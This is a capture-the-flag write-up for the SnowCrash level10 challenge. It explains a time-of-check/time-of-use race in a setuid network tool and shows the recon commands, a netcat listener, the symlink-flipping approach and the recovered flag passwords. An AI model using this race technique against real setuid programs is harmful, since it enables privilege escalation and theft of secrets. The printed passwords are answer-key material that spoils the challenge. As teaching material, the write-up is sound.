# level10 (bonus)

## Goal
Leak `flag10`'s `token` file by exploiting the `level10` network tool.

## Recon
```sh
$ ls -l ~
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
$ ~/level10
/home/user/level10/level10 file host
	sends file to host if you have access to it
$ strings ~/level10 | grep -E 'access|open|6969|Connected'
access
open
Connecting to %s:6969 ..
Connected!
You don't have access to %s
```

The tool checks `access(file, R_OK)` and, if it passes, `open()`s the file and streams
it to `host:6969`. The bug: **`access()` uses the real uid (level10)** while the
subsequent **`open()` uses the effective uid (flag10)** because the binary is setuid.
That is a classic **TOCTOU** (time-of-check / time-of-use) race.

## Wire protocol
A controlled run against a readable file shows the tool first writes an 8-byte banner
`.*( )*.\n` then the file bytes:

```
$ nc -l 6969 > cap &   # OpenBSD nc: port is positional, not -p
$ ~/level10 /tmp/f 127.0.0.1
$ xxd cap
2e2a28 20 29 2a2e 0a  D U M M Y ...      # ".*( )*." + file
```

## Exploit
Point a symlink at a **readable dummy** (so `access()` succeeds) and rapidly flip it to
the **token** (so `open()` reads the secret). Run a listener on port 6969 to catch the
leaked bytes. See `exploit.sh`: it runs a Python listener, two symlink flippers and six
`level10` hammer loops until a connection delivers a 25-char token that is not the dummy.

```sh
$ ./exploit.sh
=== RESULT ===
flag10 password (token file contents): woupa2yuojeeaaed06riuj63c
```

That is **flag10's password**:

```sh
$ ssh flag10@<VM> -p 4242        # password: woupa2yuojeeaaed06riuj63c
flag10@SnowCrash$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

## Result
- **flag10 password:** `woupa2yuojeeaaed06riuj63c`
- **level11 password (token):** `feulo4b72j7edeahuete3no7c`
